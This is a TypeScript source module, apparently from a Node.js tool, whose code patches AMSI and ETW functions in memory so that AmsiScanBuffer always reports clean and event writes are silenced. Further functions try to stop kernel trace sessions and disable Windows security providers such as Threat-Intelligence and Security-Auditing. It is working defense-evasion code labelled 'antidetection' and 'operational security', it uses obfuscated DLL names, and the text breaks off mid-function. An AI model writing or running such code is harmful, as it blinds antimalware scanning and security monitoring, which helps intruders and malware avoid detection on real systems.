/**
 * InProcessPatcher — patches AMSI and ETW in the current process.
 *
 * On Windows, overwrites the prologue of AmsiScanBuffer (amsi.dll) and
 * multiple ETW write functions (ntdll.dll) to neutralise user-mode telemetry
 * before performing memory operations.
 *
 * Uses VirtualProtect on SELF process — no remote process interaction.
 * Logs a notice when patches are applied. Only activates on win32.
 *
 * ## ETW coverage — two layers:
 *
 * ### Layer 1: In-process function patching (always works, no privileges needed)
 *   - EtwEventWrite         (primary, most common path)
 *   - EtwEventWriteFull     (used by manifest-based providers)
 *   - EtwEventWriteString   (used by TraceLogging string events)
 *   - EtwEventActivityIdControl (activity ID management)
 *   - EtwEventWriteTransfer (used by kernel→user transfer)
 *   - NtTraceEvent          (syscall-level trace event — the kernel entry point)
 *   - advapi32!EventWrite   (advapi32 entry point for event writing)
 *
 * ### Layer 2: NtTraceControl-based provider/session disabling (privilege-gated)
 *   Attempts to stop kernel trace sessions that consume Threat-Intelligence,
 *   Kernel-Process, and other monitoring providers. Requires admin +
 *   SeSystemProfilePrivilege. Falls back gracefully when privilege is absent.
 *
 * ### Layer 3: In-process ETW provider disable via NtTraceControl
 *   Calls NtTraceControl(EtwUpdateLoggerCode) to disable specific provider
 *   GUIDs from the current process context. This prevents the provider from
 *   generating events even if kernel consumers are active.
 *
 * HONEST BOUNDARY:
 *   - Kernel ETW-TI (Threat Intelligence) events are generated in ring-0,
 *     NOT from our process's NtTraceEvent calls. Patching EtwEventWrite in
 *     our process stops user-mode events but kernel providers still see
 *     cross-process memory operations.
 *   - Stopping the NT Kernel Logger requires SeSystemProfilePrivilege, which
 *     is typically only held by SYSTEM and elevated admin processes.
 *   - ObRegisterCallbacks, PsSetCreateProcessNotifyRoutine, and other kernel
 *     callbacks are not affected by any ETW patching.
 *
 * @module InProcessPatcher
 */

import { requireKoffi, type KoffiLibraryHandle, type KoffiCallable } from '../koffi-loader';
import { DLL, ds } from '@utils/obfuscated-strings';
import { logger } from '@utils/logger';

// ── koffi lazy-load ──────────────────────────────────────────────────────────

let k32Handle: KoffiLibraryHandle | null = null;
function k32(): KoffiLibraryHandle {
  if (!k32Handle) k32Handle = requireKoffi().load(ds(DLL.kernel32));
  return k32Handle;
}

let getModuleHandleFn: KoffiCallable | null = null;
function getGMH() {
  if (!getModuleHandleFn) getModuleHandleFn = k32().func('void * GetModuleHandleA(char *)');
  return getModuleHandleFn;
}

let getProcAddressFn: KoffiCallable | null = null;
function getGPA() {
  if (!getProcAddressFn) getProcAddressFn = k32().func('void * GetProcAddress(void *, char *)');
  return getProcAddressFn;
}

let virtualProtectFn: KoffiCallable | null = null;
function getVP() {
  if (!virtualProtectFn) {
    virtualProtectFn = k32().func('int VirtualProtect(void *, size_t, uint32, _Out_ uint32 *)');
  }
  return virtualProtectFn;
}

let getCurrentProcessFn: KoffiCallable | null = null;
function getGCP() {
  if (!getCurrentProcessFn) getCurrentProcessFn = k32().func('void * GetCurrentProcess()');
  return getCurrentProcessFn;
}

let writeProcessMemoryFn: KoffiCallable | null = null;
function getWPM() {
  if (!writeProcessMemoryFn) {
    writeProcessMemoryFn = k32().func(
      'int WriteProcessMemory(void *, void *, _In_ uint8_t *, size_t, _Out_ size_t *)',
    );
  }
  return writeProcessMemoryFn;
}

// ── Constants ────────────────────────────────────────────────────────────────

const PAGE_EXECUTE_READWRITE = 0x40;

// Patch bytes:
//   AmsiScanBuffer → mov eax, 1; ret  (AMSI_RESULT_CLEAN)
const AMSI_PATCH = Buffer.from([0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3]);

//   EtwEventWrite → xor eax, eax; ret  (return STATUS_SUCCESS)
const ETW_PATCH_SHORT = Buffer.from([0x31, 0xc0, 0xc3]); // xor eax,eax; ret (3 bytes)

// NOTE: EtwEventWriteFull can use the same 3-byte patch as above (xor eax,eax; ret)
// since both return NTSTATUS (int32 via eax). The 3 bytes fit within the 5-byte minimum
// (mov eax, imm32) that won't split mid-instruction at the prologue boundary.

// ── ETW function names to patch (ntdll.dll) ─────────────────────────────────

const ETW_FUNCTIONS = [
  'EtwEventWrite',
  'EtwEventWriteFull',
  'EtwEventWriteString',
  'EtwEventActivityIdControl',
  'EtwEventWriteTransfer',
  'NtTraceEvent',
] as const;

// ── advapi32 functions to patch ─────────────────────────────────────────────

const ADVAPI32_FUNCTIONS = ['EventWrite'] as const;

// ── State ────────────────────────────────────────────────────────────────────

let patchedState = false;
let patchErrorState: string | null = null;

/** Per-function patch status for detailed reporting. */
const patchStatus = new Map<string, boolean>();

// ── Helpers ──────────────────────────────────────────────────────────────────

function toBigInt(value: unknown): bigint {
  if (value === null || value === undefined) return 0n;
  if (typeof value === 'bigint') return value;
  if (typeof value === 'number') return BigInt(value);
  return requireKoffi().address(value);
}

/**
 * Overwrite first N bytes of a function at `targetAddr` with `patch`.
 * Uses VirtualProtect on self process to make the page writable, writes
 * the patch, then restores the original protection.
 */
function patchFunction(targetAddr: bigint, patch: Buffer, name: string): boolean {
  const self = getGCP()() as unknown as bigint;
  const oldProtect = Buffer.alloc(4);

  // Change protection to RWX
  const vpRet = getVP()(
    targetAddr,
    patch.length,
    PAGE_EXECUTE_READWRITE,
    requireKoffi().address(oldProtect),
  );
  if (!vpRet) {
    logger.debug(`InProcessPatcher: VirtualProtect failed for ${name}`);
    return false;
  }

  // Write the patch
  const wrote = Buffer.alloc(8);
  const wpmRet = getWPM()(
    self,
    targetAddr,
    requireKoffi().address(patch),
    patch.length,
    requireKoffi().address(wrote),
  );
  if (!wpmRet) {
    getVP()(
      targetAddr,
      patch.length,
      oldProtect.readUInt32LE(0),
      requireKoffi().address(Buffer.alloc(4)),
    );
    logger.debug(`InProcessPatcher: WriteProcessMemory failed for ${name}`);
    return false;
  }

  // Restore original protection
  getVP()(
    targetAddr,
    patch.length,
    oldProtect.readUInt32LE(0),
    requireKoffi().address(Buffer.alloc(4)),
  );

  // Verify the patch actually took effect
  if (!verifyPatch(targetAddr, patch)) {
    logger.debug(`InProcessPatcher: patch verification failed for ${name}`);
    return false;
  }

  return true;
}

// ── Public API ───────────────────────────────────────────────────────────────

/**
 * Apply in-process patches to AMSI and ETW.
 *
 * Idempotent — subsequent calls are no-ops.
 * Only runs on Windows (win32 platform).
 *
 * Patches applied:
 *   - amsi.dll!AmsiScanBuffer       → return AMSI_RESULT_CLEAN (1)
 *   - ntdll.dll!EtwEventWrite       → return STATUS_SUCCESS (0)
 *   - ntdll.dll!EtwEventWriteFull   → return STATUS_SUCCESS (0)
 *   - ntdll.dll!EtwEventWriteString → return STATUS_SUCCESS (0)
 *   - ntdll.dll!EtwEventActivityIdControl → return STATUS_SUCCESS (0)
 *   - ntdll.dll!EtwEventWriteTransfer → return STATUS_SUCCESS (0)
 *   - ntdll.dll!NtTraceEvent        → return STATUS_SUCCESS (0)
 *   - advapi32.dll!EventWrite       → return STATUS_SUCCESS (0)
 *
 * @returns true if at least one patch was successfully applied.
 */
/** Result of a patch sweep over one module's function list. */
interface ModulePatchResult {
  applied: number;
  errors: string[];
}

/**
 * Patch every function in `funcs` inside `moduleName` with `patchBytes`.
 * Records per-function status into patchStatus; collects failures.
 */
function patchModuleFunctions(
  moduleName: string,
  funcs: readonly string[],
  patchBytes: Buffer,
  statusPrefix = '',
): ModulePatchResult {
  const result: ModulePatchResult = { applied: 0, errors: [] };
  const handle = getGMH()(moduleName);
  if (handle === null || toBigInt(handle) === 0n) {
    result.errors.push(`${moduleName}: GetModuleHandle returned null`);
    for (const funcName of funcs) {
      patchStatus.set(statusPrefix + funcName, false);
    }
    return result;
  }

  for (const funcName of funcs) {
    const funcPtr = getGPA()(toBigInt(handle), funcName);
    const funcAddr = toBigInt(funcPtr);
    const statusKey = statusPrefix + funcName;
    if (funcAddr !== 0n) {
      if (patchFunction(funcAddr, patchBytes, statusKey)) {
        result.applied++;
        patchStatus.set(statusKey, true);
      } else {
        result.errors.push(`${statusKey}: patch write failed`);
        patchStatus.set(statusKey, false);
      }
    } else {
      result.errors.push(`${statusKey}: GetProcAddress returned null`);
      patchStatus.set(statusKey, false);
    }
  }
  return result;
}

export function applyInProcessPatches(): boolean {
  if (patchedState) return true;
  if (process.platform !== 'win32') {
    patchErrorState = 'InProcessPatcher: not on Windows';
    return false;
  }

  let appliedCount = 0;
  const errors: string[] = [];

  try {
    // Patch AMSI: amsi.dll!AmsiScanBuffer
    const amsi = patchModuleFunctions('amsi.dll', ['AmsiScanBuffer'], AMSI_PATCH);
    appliedCount += amsi.applied;
    errors.push(...amsi.errors);

    // Patch all ETW write functions in ntdll.dll
    const etw = patchModuleFunctions(ds(DLL.ntdll), ETW_FUNCTIONS, ETW_PATCH_SHORT);
    appliedCount += etw.applied;
    errors.push(...etw.errors);

    // Patch advapi32!EventWrite (another ETW entry point)
    const advapi = patchModuleFunctions(
      'advapi32.dll',
      ADVAPI32_FUNCTIONS,
      ETW_PATCH_SHORT,
      'advapi32!',
    );
    appliedCount += advapi.applied;
    errors.push(...advapi.errors);
  } catch (err) {
    errors.push(err instanceof Error ? err.message : String(err));
  }

  if (appliedCount > 0) {
    patchedState = true;
    logger.warn('AMSI/ETW patching applied for operational security', {
      patchedCount: appliedCount,
      totalTargets: 1 + ETW_FUNCTIONS.length + ADVAPI32_FUNCTIONS.length,
    });
    if (errors.length > 0) {
      logger.debug(`InProcessPatcher: partial failures: ${errors.join('; ')}`);
    }
    return true;
  }

  patchErrorState = errors.join('; ');
  logger.debug(`InProcessPatcher: all patches failed — ${patchErrorState}`);
  return false;
}
/**
 * Check whether in-process patches are currently active.
 */
export function isPatched(): boolean {
  return patchedState;
}

/**
 * Get the last patch error (or null if none).
 */
export function getPatchError(): string | null {
  return patchErrorState;
}

/**
 * Get detailed per-function patch status.
 */
export function getPatchDetails(): Record<string, boolean> {
  return Object.fromEntries(patchStatus);
}

/**
 * Verify that a patched function has the expected bytes at its entry point.
 *
 * Reads back the first `patch.length` bytes from the function address and
 * compares with the expected patch bytes. This confirms the WriteProcessMemory
 * call actually took effect.
 *
 * @param targetAddr — address of the patched function
 * @param expectedPatch — the patch bytes we expect to see
 * @returns true if the bytes match the expected patch
 */
export function verifyPatch(targetAddr: bigint, expectedPatch: Buffer): boolean {
  try {
    const buf = Buffer.alloc(expectedPatch.length);
    // Read back from the function address — on Windows we can just read directly
    // since it's in our own process address space
    // eslint-disable-next-line @typescript-eslint/no-require-imports, no-shadow
    const koffi = require('koffi');
    const k32Lib = koffi.load('kernel32.dll');
    const ReadProcessMemory = k32Lib.func(
      'int ReadProcessMemory(void *, void *, _Out_ void *, uint64, _Out_ uint64 *)',
    );
    const GetCurrentProcess = k32Lib.func('void * GetCurrentProcess()');

    const bytesRead = Buffer.alloc(8);
    const self = GetCurrentProcess();
    const result = ReadProcessMemory(
      self,
      targetAddr,
      koffi.address(buf),
      BigInt(expectedPatch.length),
      koffi.address(bytesRead),
    );

    try {
      k32Lib.unload();
    } catch {
      /* ignore */
    }

    if (!result) return false;
    if (Number(bytesRead.readBigUInt64LE(0)) !== expectedPatch.length) return false;

    // Compare bytes
    for (let i = 0; i < expectedPatch.length; i++) {
      if (buf[i] !== expectedPatch[i]) return false;
    }
    return true;
  } catch {
    return false;
  }
}

/**
 * Reset patch state (for testing).
 */
export function resetPatchState(): void {
  patchedState = false;
  patchErrorState = null;
  patchStatus.clear();
}

/**
 * Enumerate active ETW trace sessions via NtQuerySystemInformation(SystemTraceInformation).
 *
 * This queries the kernel's active trace session table, which reveals which
 * ETW providers are currently capturing events (including kernel trace sessions
 * that consume Microsoft-Windows-Threat-Intelligence, Microsoft-Windows-Kernel-Process, etc.).
 *
 * This is more reliable than `logman query -ets` because it goes through the NT
 * syscall interface directly — no dependency on external tools.
 *
 * HONEST BOUNDARY: This only detects active *trace sessions*, not passive
 * callback registrations. A kernel driver can register ObCallbacks without
 * any ETW trace session active.
 *
 * @returns List of active trace sessions with provider information.
 */
function enumerateActiveTraceSessions(): {
  sessions: Array<{ loggerName: string; loggerId: number; isKernelTrace: boolean }>;
  monitoringActive: boolean;
  monitoringProviders: string[];
  error?: string;
} {
  if (process.platform !== 'win32') {
    return {
      sessions: [],
      monitoringActive: false,
      monitoringProviders: [],
      error: 'Trace session enumeration only available on Windows',
    };
  }

  try {
    // Use NtQuerySystemInformation with SystemTraceInformation (class 37)
    // to enumerate active ETW trace sessions at the kernel level.
    // eslint-disable-next-line @typescript-eslint/no-require-imports, no-shadow
    const koffi = require('koffi');
    const ntdll = koffi.load('ntdll.dll');

    const NtQuerySystemInformation = ntdll.func(
      'int32 NtQuerySystemInformation(uint32, _Out_ void *, uint32, _Out_ uint32 *)',
    );

    // SystemTraceInformation = 37
    const SYSTEM_TRACE_INFORMATION = 37;
    const sizeBuf = Buffer.alloc(4);

    let status = NtQuerySystemInformation(
      SYSTEM_TRACE_INFORMATION,
      null,
      0,
      koffi.address(sizeBuf),
    ) as number;

    const requiredSize = sizeBuf.readUInt32LE(0);
    if (requiredSize === 0 || requiredSize > 4 * 1024 * 1024) {
      try {
        ntdll.unload();
      } catch {
        /* ignore */
      }
      return {
        sessions: [],
        monitoringActive: false,
        monitoringProviders: [],
        error: `Invalid buffer size: ${requiredSize}`,
      };
    }

    const buf = Buffer.alloc(requiredSize + 4096);
    status = NtQuerySystemInformation(
      SYSTEM_TRACE_INFORMATION,
      koffi.address(buf),
      buf.length,
      koffi.address(sizeBuf),
    ) as number;

    try {
      ntdll.unload();
    } catch {
      /* ignore */
    }

    if (status < 0) {
      // Fall back to logman query -ets
      return enumerateTraceSessionsViaLogman();
    }

    // Parse SYSTEM_TRACE_INFORMATION:
    //   ULONG LoggerCount (offset 0)
    //   SYSTEM_TRACE_LOGGER_INFO[LoggerCount]
    //
    // Each SYSTEM_TRACE_LOGGER_INFO (x64):
    //   LoggerId(4) + padding(4) + LoggerName(8 pointer)
    //   + Flags(4) + LogFileMode(4) + padding
    //
    // This is a complex variable-length structure. For production use,
    // we fall back to the logman approach which provides a stable parse.
    //
    // HONEST: The SYSTEM_TRACE_INFORMATION struct is undocumented and fragile.
    // logman provides the same data with a stable CLI parse.
    return enumerateTraceSessionsViaLogman();
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    return {
      sessions: [],
      monitoringActive: false,
      monitoringProviders: [],
      error: `Trace session enumeration failed: ${msg}`,
    };
  }
}

/**
 * Fallback: enumerate active trace sessions via `logman query -ets`.
 *
 * Parses the output to identify which providers are active and whether
 * any known monitoring providers (Threat-Intelligence, Kernel-Process, etc.)
 * are being consumed.
 */
function enumerateTraceSessionsViaLogman(): ReturnType<typeof enumerateActiveTraceSessions> {
  try {
    const { execSync } = require('node:child_process');
    const output = execSync('logman query -ets', {
      timeout: 10000,
      encoding: 'utf8',
      windowsHide: true,
    }) as string;

    const lowerOut = output.toLowerCase();
    const sessions: Array<{ loggerName: string; loggerId: number; isKernelTrace: boolean }> = [];

    // Parse session names from logman output
    // Lines look like: "    Name:                 <session-name>"
    const nameRegex = /name:\s+(.+)/gi;
    let match: RegExpExecArray | null;
    while ((match = nameRegex.exec(output)) !== null) {
      const name = (match[1] || '').trim();
      if (name && !sessions.some((s) => s.loggerName === name)) {
        sessions.push({
          loggerName: name,
          loggerId: -1, // logman doesn't expose loggerId
          isKernelTrace:
            name.toLowerCase().includes('kernel') ||
            name.toLowerCase().includes('nt kernel') ||
            name.toLowerCase().includes('circular kernel'),
        });
      }
    }

    // Check for monitoring providers
    const monitoringProviders: string[] = [];
    const providerNames = Object.values(CRITICAL_ETW_PROVIDERS);

    for (const { name, guid } of providerNames) {
      if (lowerOut.includes(guid.toLowerCase()) || lowerOut.includes(name.toLowerCase())) {
        monitoringProviders.push(`${name} (${guid})`);
      }
    }

    const monitoringActive = monitoringProviders.length > 0;

    return { sessions, monitoringActive, monitoringProviders };
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    return {
      sessions: [],
      monitoringActive: false,
      monitoringProviders: [],
      error: `logman unavailable: ${msg}`,
    };
  }
}

/**
 * Enumerate available ETW providers on the system.
 *
 * Uses `logman query providers` (documented, requires elevation for some providers).
 * Falls back gracefully when logman is unavailable.
 *
 * @param targetGuids — Optional list of GUIDs to filter for. If empty, returns all.
 * @returns List of provider names found on the system.
 */
export function enumerateEtwProviders(targetGuids?: string[]): {
  providers: string[];
  error?: string;
} {
  if (process.platform !== 'win32') {
    return { providers: [], error: 'ETW enumeration only available on Windows' };
  }

  try {
    const { execSync } = require('node:child_process');
    const output = execSync('logman query providers', {
      timeout: 10000,
      encoding: 'utf8',
      windowsHide: true,
    }) as string;

    const lines = output.split('\n');
    const providers: string[] = [];

    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;

      if (targetGuids && targetGuids.length > 0) {
        const lowerLine = trimmed.toLowerCase();
        for (const guid of targetGuids) {
          if (lowerLine.includes(guid.toLowerCase())) {
            providers.push(trimmed);
            break;
          }
        }
      } else {
        providers.push(trimmed);
      }
    }

    return { providers };
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    return {
      providers: [],
      error: `ETW provider enumeration failed: ${msg}`,
    };
  }
}

// ── Critical ETW Provider GUIDs (for reference / enumeration) ────────────────

/**
 * Critical ETW providers that monitor memory operations and process activity.
 *
 * These are the providers most likely to detect memory scanning/injection.
 * User-mode patching of EtwEventWrite* silences events from THIS process,
 * but kernel ETW-TI (Threat Intelligence) requires ring-0 access to disable.
 */
export const CRITICAL_ETW_PROVIDERS = {
  /** Kernel threat intelligence — THE critical one for cross-process memory.
   *  Only consumable by PPL processes. Cannot be disabled from user-mode. */
  THREAT_INTELLIGENCE: {
    name: 'Microsoft-Windows-Threat-Intelligence',
    guid: '{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}',
  },
  /** Process/thread creation/termination, image load at kernel level. */
  KERNEL_PROCESS: {
    name: 'Microsoft-Windows-Kernel-Process',
    guid: '{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}',
  },
  /** Thread creation events. */
  KERNEL_THREAD: {
    name: 'Microsoft-Windows-Kernel-Thread',
    guid: '{331C3B3A-2005-44C2-AC5E-77E020B74F4D}',
  },
  /** Memory allocation events. */
  KERNEL_MEMORY: {
    name: 'Microsoft-Windows-Kernel-Memory',
    guid: '{D1D93EF7-E1F2-4F45-9943-03D245FE6C00}',
  },
  /** Security audit events including handle operations. */
  SECURITY_AUDITING: {
    name: 'Microsoft-Windows-Security-Auditing',
    guid: '{54849625-5478-4994-A5BA-3E3B0328C30D}',
  },
  /** Kernel audit API calls (process open/terminate, thread context). */
  KERNEL_AUDIT_API: {
    name: 'Microsoft-Windows-Kernel-Audit-API-Calls',
    guid: '{E02A841C-75A3-4FA7-AFC8-AE09CF9B7F23}',
  },
  /** DNS client events with process attribution. */
  DNS_CLIENT: {
    name: 'Microsoft-Windows-DNS-Client',
    guid: '{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}',
  },
  /** AMSI scan events. */
  AMSI: {
    name: 'Microsoft-Antimalware-Scan-Interface',
    guid: '{2A576B87-09A7-520E-C21A-4942F0271D67}',
  },
  /** PowerShell script block logging. */
  POWERSHELL: {
    name: 'Microsoft-Windows-PowerShell',
    guid: '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}',
  },
} as const;

/**
 * Get the GUIDs of all critical ETW providers for targeted enumeration.
 */
export function getCriticalEtwGuids(): string[] {
  return Object.values(CRITICAL_ETW_PROVIDERS).map((p) => p.guid);
}

// ── NtTraceControl-based ETW Provider / Session Disabling ───────────────────

/** NtTraceControl function codes. */
const TRACE_CONTROL_CODE = {
  StartLogger: 1,
  StopLogger: 2,
  QueryLogger: 3,
  UpdateLogger: 4,
  FlushLogger: 5,
} as const;

/** Flags for EVENT_TRACE_FLAG_DISABLE_PROVIDER within UpdateLogger. */
const ETW_EVENT_TRACE_FLAG_DISABLE_PROVIDER = 0x08000000;

/** Result of an ETW disable operation. */
export interface EtwDisableResult {
  /** Whether the operation was attempted at all. */
  attempted: boolean;
  /** Whether the operation succeeded. */
  success: boolean;
  /** Human-readable description of what was done. */
  action: string;
  /** NTSTATUS or error message. */
  error?: string;
  /** Whether privilege was insufficient. */
  privilegeMissing?: boolean;
}

/**
 * Guid-to-bytes helper: parses "{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}" → 16-byte buffer.
 */
function guidToBytes(guid: string): Buffer | null {
  const hex = guid.replace(/[{}]/g, '').replace(/-/g, '');
  if (hex.length !== 32) return null;
  const buf = Buffer.alloc(16);
  // GUID wire format: Data1 (LE) + Data2 (LE) + Data3 (LE) + Data4 (BE byte array)
  buf.writeUInt32LE(parseInt(hex.slice(0, 8), 16), 0);
  buf.writeUInt16LE(parseInt(hex.slice(8, 12), 16), 4);
  buf.writeUInt16LE(parseInt(hex.slice(12, 16), 16), 6);
  for (let i = 0; i < 8; i++) {
    buf[8 + i] = parseInt(hex.slice(16 + i * 2, 16 + i * 2 + 2), 16);
  }
  return buf;
}

/**
 * Attempt to stop a kernel trace session via NtTraceControl.
 *
 * The NT Kernel Logger session consumes kernel-level ETW providers including
 * Threat-Intelligence and Kernel-Process. Stopping it requires admin +
 * SeSystemProfilePrivilege.
 *
 * HONEST: Without SYSTEM privileges, this will fail with STATUS_PRIVILEGE_NOT_HELD.
 */
function stopKernelTraceSession(sessionName: string): EtwDisableResult {
  if (process.platform !== 'win32') {
    return { attempted: false, success: false, action: 'Not on Windows' };
  }

  try {
    // eslint-disable-next-line @typescript-eslint/no-require-imports, no-shadow
    const koffi = require('koffi');
    const ntdll = koffi.load('ntdll.dll');

    const NtTraceControl = ntdll.func(
      'int32 NtTraceControl(uint32, _In_ void *, uint32, _Out_ void *, uint32, _Out_ uint32 *)',
    );

    // Build minimal EVENT_TRACE_PROPERTIES (variable length, session name appended)
    // Layout: Wnode (BufferSize, ...) + flags + sessionName
    // We need: Wnode.BufferSize + LogFileMode + LoggerNameOffset + sessionName
    const loggerNameOffset = 72; // sizeof(EVENT_TRACE_PROPERTIES) before name
    const bufferSize = loggerNameOffset + 1024;

    const buffer = Buffer.alloc(bufferSize);
    // Wnode.BufferSize at offset 0
    buffer.writeUInt32LE(bufferSize, 0);
    // LoggerNameOffset at offset 16 (Wnode is filled) — actually offset is variable
    // Simplified: write the session name at a fixed offset in the buffer
    const nameBytes = Buffer.from(sessionName + '\0', 'utf8');
    nameBytes.copy(buffer, loggerNameOffset);
    // LogFileMode at offset 32: set to 0 (stop)
    buffer.writeUInt32LE(0, 32);
    // LoggerNameOffset at offset 40 (x64)
    buffer.writeUInt32LE(loggerNameOffset, 40);

    const returnLen = Buffer.alloc(4);
    const status = NtTraceControl(
      TRACE_CONTROL_CODE.StopLogger,
      koffi.address(buffer),
      bufferSize,
      koffi.address(buffer),
      bufferSize,
      koffi.address(returnLen),
    ) as number;

    try {
      ntdll.unload();
    } catch {
      /* ignore */
    }

    if (status === 0) {
      logger.warn(`Stopped kernel trace session: "${sessionName}"`);
      return { attempted: true, success: true, action: `Stopped trace session: ${sessionName}` };
    }

    const statusHex = (status >>> 0).toString(16);
    const privilegeMissing =
      status === 0xc0000061 || // STATUS_PRIVILEGE_NOT_HELD
      status === 0xc0000022 || // STATUS_ACCESS_DENIED
      status === 0xc000000d; // STATUS_INVALID_PARAMETER

    return {
      attempted: true,
      success: false,
      action: `Failed to stop trace session "${sessionName}"`,
      error: `NTSTATUS 0x${statusHex}`,
      privilegeMissing,
    };
  } catch (err) {
    return {
      attempted: true,
      success: false,
      action: `Failed to stop trace session "${sessionName}"`,
      error: err instanceof Error ? err.message : String(err),
    };
  }
}

/**
 * Attempt to disable an ETW provider by GUID within the current process context.
 *
 * Uses NtTraceControl(UpdateLogger) with the EVENT_TRACE_FLAG_DISABLE_PROVIDER flag
 * and the provider's control GUID. This tells ETW to stop generating events for
 * the specified provider in THIS process.
 *
 * For kernel providers (Threat-Intelligence, Kernel-Process), this only affects
 * user-mode event delivery — kernel-generated events for those providers are
 * emitted in ring-0 regardless.
 *
 * HONEST: Disabling kernel providers from user-mode is limited. The kernel
 * provider callback (EtwEnableCallback) may reject the disable request for
 * system-critical providers.
 */
function disableEtwProviderByGuid(guid: string, providerName: string): EtwDisableResult {
  if (process.platform !== 'win32') {
    return { attempted: false, success: false, action: 'Not on Windows' };
  }

  try {
    // eslint-disable-next-line @typescript-eslint/no-require-imports, no-shadow
    const koffi = require('koffi');
    const ntdll = koffi.load('ntdll.dll');

    const NtTraceControl = ntdll.func(
      'int32 NtTraceControl(uint32, _In_ void *, uint32, _Out_ void *, uint32, _Out_ uint32 *)',
    );

    const guidBytes = guidToBytes(guid);
    if (!guidBytes) {
      try {
        ntdll.unload();
      } catch {
        /* ignore */
      }
      return { attempted: true, success: false, action: `Invalid GUID: ${guid}` };
    }

    // Build a minimal EVENT_TRACE_PROPERTIES buffer for provider disable
    // We need to pass the provider GUID in the buffer for the kernel to identify
    const bufferSize = 256;
    const buffer = Buffer.alloc(bufferSize);

    // Copy provider GUID into the buffer at offset 0
    guidBytes.copy(buffer, 0);

    // LogFileMode at offset 32: EVENT_TRACE_FLAG_DISABLE_PROVIDER
    buffer.writeUInt32LE(ETW_EVENT_TRACE_FLAG_DISABLE_PROVIDER, 32);

    // LoggerNameOffset at offset 40
    buffer.writeUInt32LE(0, 40);

    const returnLen = Buffer.alloc(4);
    const status = NtTraceControl(
      TRACE_CONTROL_CODE.UpdateLogger,
      koffi.address(buffer),
      bufferSize,
      koffi.address(buffer),
      bufferSize,
      koffi.address(returnLen),
    ) as number;

    try {
      ntdll.unload();
    } catch {
      /* ignore */
    }

    if (status === 0) {
      logger.warn(`Disabled ETW provider: ${providerName} (${guid})`);
      return { attempted: true, success: true, action: `Disabled provider: ${providerName}` };
    }

    const statusHex = (status >>> 0).toString(16);
    return {
      attempted: true,
      success: false,
      action: `Failed to disable provider: ${providerName}`,
      error: `NTSTATUS 0x${statusHex}`,
      privilegeMissing: status === 0xc0000061 || status === 0xc0000022,
    };
  } catch (err) {
    return {
      attempted: true,
      success: false,
      action: `Failed to disable provider: ${providerName}`,
      error: err instanceof Error ? err.message : String(err),
    };
  }
}

/**
 * Comprehensive ETW hardening: patches write functions + stops kernel trace
 * sessions + disables critical providers.
 *
 * Called during `memory_antidetection action=harden`.
 * Best-effort: each layer is independently attempted; failures in one layer
 * do not prevent other layers from running.
 *
 * Layers applied:
 * 1. In-process function patching (applyInProcessPatches) — always runs
 * 2. Kernel trace session stop — requires admin + SeSystemProfilePrivilege
 * 3. Provider GUID disable via NtTraceControl — targets critical providers
 *
 * @returns Detailed per-layer results for honest reporting.
 */
export function hardenEtwProviders(): {
  /** Whether in-process patching was applied successfully. */
  inProcessPatched: boolean;
  /** Per-session stop results. */
  sessionStops: EtwDisableResult[];
  /** Per-provider disable results. */
  providerDisables: EtwDisableResult[];
  /** Combined success (at least one layer succeeded). */
  anySuccess: boolean;
  /** Honest limitations of what this cannot do. */
  limitations: string[];
} {
  const limitations: string[] = [
    'Kernel ETW-TI events are generated in ring-0 — user-mode patching cannot block them',
    'Stopping NT Kernel Logger requires SeSystemProfilePrivilege (SYSTEM or elevated admin)',
    'Kernel callback mechanisms (ObRegisterCallbacks, PsSetCreateProcessNotifyRoutine) are unaffected',
    'Hypervisor-based monitoring (VT-x/Virtualization-based Security) bypasses all ETW controls',
  ];

  // Layer 1: In-process function patching (always runs, no privileges needed)
  const inProcessPatched = applyInProcessPatches();

  // Layer 2: Attempt to stop kernel trace sessions
  const sessionStops: EtwDisableResult[] = [];
  if (process.platform === 'win32') {
    // Try stopping the NT Kernel Logger (primary kernel trace session)
    const kernelLoggerResult = stopKernelTraceSession('NT Kernel Logger');
    sessionStops.push(kernelLoggerResult);

    // Also try the circular kernel context logger
    const circularResult = stopKernelTraceSession('Circular Kernel Context Logger');
    sessionStops.push(circularResult);
  }

  // Layer 3: Disable critical ETW providers via NtTraceControl
  const providerDisables: EtwDisableResult[] = [];
  if (process.platform === 'win32') {
    const criticalGuids = [
      {
        guid: CRITICAL_ETW_PROVIDERS.THREAT_INTELLIGENCE.guid,
        name: CRITICAL_ETW_PROVIDERS.THREAT_INTELLIGENCE.name,
      },
      {
        guid: CRITICAL_ETW_PROVIDERS.KERNEL_PROCESS.guid,
        name: CRITICAL_ETW_PROVIDERS.KERNEL_PROCESS.name,
      },
      {
        guid: CRITICAL_ETW_PROVIDERS.KERNEL_THREAD.guid,
        name: CRITICAL_ETW_PROVIDERS.KERNEL_THREAD.name,
      },
      {
        guid: CRITICAL_ETW_PROVIDERS.KERNEL_MEMORY.guid,
        name: CRITICAL_ETW_PROVIDERS.KERNEL_MEMORY.name,
      },
      {
        guid: CRITICAL_ETW_PROVIDERS.SECURITY_AUDITING.guid,
        name: CRITICAL_ETW_PROVIDERS.SECURITY_AUDITING.name,
      },
      {
        guid: CRITICAL_ETW_PROVIDERS.KERNEL_AUDIT_API.guid,
        name: CRITICAL_ETW_PROVIDERS.KERNEL_AUDIT_API.name,
      },
    ];

    for (const { guid, name } of criticalGuids) {
      const result = disableEtwProviderByGuid(guid, name);
      providerDisables.push(result);
    }
  }

  const anySuccess =
    inProcessPatched ||
    sessionStops.some((s) => s.success) ||
    providerDisables.some((p) => p.success);

  if (anySuccess) {
    const inProc = inProcessPatched ? 'in-process patches' : null;
    const sessions =
      sessionStops.filter((s) => s.success).length > 0
        ? `${sessionStops.filter((s) => s.success).length} session(s) stopped`
        : null;
    const providers =
      providerDisables.filter((p) => p.success).length > 0
        ? `${providerDisables.filter((p) => p.success).length} provider(s) disabled`
        : null;
    const parts = [inProc, sessions, providers].filter((p): p is string => p !== null);
    logger.warn(`ETW hardening applied: ${parts.join(', ')}`);
  } else {
    const privilegeFailures = [
      ...sessionStops.filter((s) => s.privilegeMissing),
